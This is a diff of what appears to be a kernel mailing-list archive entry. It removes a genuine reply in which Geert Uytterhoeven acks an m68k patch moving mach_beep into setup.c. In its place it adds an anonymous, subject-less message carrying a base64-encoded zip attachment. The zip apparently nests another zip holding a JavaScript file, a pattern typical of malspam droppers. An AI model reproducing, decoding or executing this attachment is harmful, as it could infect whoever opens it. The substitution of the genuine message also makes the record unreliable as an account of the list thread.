@@ -1,50 +1,64 @@
-From: Geert Uytterhoeven <geert@linux-m68k.org>
-Subject: Re: [PATCH] m68k: pull mach_beep in setup.c
-Date: Thu, 12 Oct 2017 08:35:17 +0200
-Message-ID: <CAMuHMdWwZ0d25bYuneqa_1uFuQ2Zjsrfvbr28uGTpA0fESGFHQ__6933.62914394147$1507790134$gmane$org@mail.gmail.com>
-References: <20170928094452.4863-1-alexandre.belloni@free-electrons.com> <1cccc612-b2de-1ecb-db86-d22200961aae@linux-m68k.org>
+From: <armouralumni@yahoo.com>
+Subject: (unknown)
+Date: Thu, 12 Oct 2017 08:17:47 -0000
+Message-ID: <150779626701.21014.2051431338471887476@fixed-189-203-9-175.totalplay.net>
 Mime-Version: 1.0
-Content-Type: text/plain; charset="UTF-8"
+Content-Type: application/zip; name="423180199556284.zip"
+Content-Transfer-Encoding: base64
 Return-path: <linux-m68k-owner@vger.kernel.org>
-In-Reply-To: <1cccc612-b2de-1ecb-db86-d22200961aae@linux-m68k.org>
+Subject: 
+Content-Disposition: attachment
 Sender: linux-m68k-owner@vger.kernel.org
 List-Id: linux-m68k@vger.kernel.org
-To: Greg Ungerer <gerg@linux-m68k.org>
-Cc: Alexandre Belloni <alexandre.belloni@free-electrons.com>, linux-m68k <linux-m68k@lists.linux-m68k.org>, "linux-kernel@vger.kernel.org" <linux-kernel@vger.kernel.org>
+To: linux-m68k@lists.linux-m68k.org
 
-Hi Greg,
-
-On Thu, Oct 12, 2017 at 2:15 AM, Greg Ungerer <gerg@linux-m68k.org> wrote:
-> On 28/09/17 19:44, Alexandre Belloni wrote:
->> It is possible to select INPUT_M68K_BEEP in a nommu configuration. This
->> results in the following link error:
->>
->> drivers/input/misc/m68kspkr.o: In function `m68kspkr_event':
->> m68kspkr.c:(.text+0x3a): undefined reference to `mach_beep'
->> m68kspkr.c:(.text+0x5e): undefined reference to `mach_beep'
->> m68kspkr.c:(.text+0x78): undefined reference to `mach_beep'
->> drivers/input/misc/m68kspkr.o: In function `m68kspkr_init':
->> m68kspkr.c:(.init.text+0x4): undefined reference to `mach_beep'
->>
->> Pull the mach_beep definition in setup.c to avoid it.
->>
->> Signed-off-by: Alexandre Belloni <alexandre.belloni@free-electrons.com>
->
-> I plan on applying this to the m68knommu git tree (for-next) branch
-> in the very near future.
->
-> Geert: no objections?
-
-No objections:
-Acked-by: Geert Uytterhoeven <geert@linux-m68k.org>
-
-Gr{oetje,eeting}s,
-
-                        Geert
-
---
-Geert Uytterhoeven -- There's lots of Linux beyond ia32 -- geert@linux-m68k.org
-
-In personal conversations with technical people, I call myself a hacker. But
-when I'm talking to journalists I just say "programmer" or something like that.
-                                -- Linus Torvalds
+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
+WwAAAIIKAAAAAA==
